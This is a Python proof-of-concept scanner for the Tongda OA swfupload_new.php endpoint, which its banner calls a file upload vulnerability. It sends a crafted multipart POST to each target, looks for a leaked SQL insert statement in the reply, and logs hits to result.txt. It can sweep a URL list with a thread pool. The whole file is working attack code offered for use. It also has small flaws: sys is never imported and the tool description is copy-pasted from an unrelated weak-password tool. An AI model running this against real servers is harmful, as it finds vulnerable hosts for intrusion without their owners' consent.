# -*- coding: utf-8 -*-
import time
import requests
import urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib import parse
from rich.console import Console
import argparse
import re
import base64
import multiprocessing
from multiprocessing.dummy import Pool
import concurrent.futures
import json
import warnings
import random
warnings.filterwarnings("ignore")


def banner():
    test = """

8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
 Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
  Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
   "8aa8"      88           88,d88'      88 88  `8b   88 88             
    `88'       88           8888"88,     88 88   `8b  88 88      88888  
     88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
     88        88           88     "88,  88 88     `8888  Y8a.    .a88  
     88        88           88       Y8b 88 88      `888   `"Y88888P"   

                 888888888888 

                 tag:  this is a 通达swfupload_new.php 文件上传漏洞 poc                                       
                             @version: 1.0.0   @author: Y1_K1NG           
"""
    print(test)
def randomInt(s,e):
	key=random.randint(int(s),int(e))
	return key

def poc(target):


    try:
        if target[-1] == '/':
            target = target
        else:
            target = target + "/"
        url = target + '/general/file_folder/swfupload_new.php'
        headers = {
            'Content-Type': 'multipart/form-data; boundary=----------GFioQpMK0vv2',
            'Accept-Encoding': 'gzip'
        }
        data = '''------------GFioQpMK0vv2\r
        Content-Disposition: form-data; name="ATTACHMENT_ID"\r
        \r
        1\r
        ------------GFioQpMK0vv2\r
        Content-Disposition: form-data; name="ATTACHMENT_NAME"\r
        \r
        1\r
        ------------GFioQpMK0vv2\r
        Content-Disposition: form-data; name="FILE_SORT"\r
        \r
        2\r
        ------------GFioQpMK0vv2\r
        Content-Disposition: form-data; name="SORT_ID"\r
        \r
        ------------GFioQpMK0vv2--'''
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        # response.encoding='utf-8'
        # print(response.text)
        match = re.search(r"insert into FILE_CONTENT", response.text)
        if match:
            print(f"[+]{target} is valuable")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-]{target} is not valuable")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(?:https?://)?([\w\.]+):?(\d+)?", url)
    if match:
        host, port = match.groups()
        if not port:
            if "https" in url:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None

def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        host, port = extract_host(args.url)
        if host:
            if "https" in args.url:
                url = f"https://{host}:{port}"
            else:
                url = f"http://{host}:{port}"
            poc(url)
        else:
            print(f"Invalid URL: {args.url}")
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                host, port = extract_host(url)
                if host:
                    if "https" in url:
                        url_list.append(f"https://{host}:{port}")
                    else:
                        url_list.append(f"http://{host}:{port}")
                else:
                    print(f"Invalid URL: {url}")

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
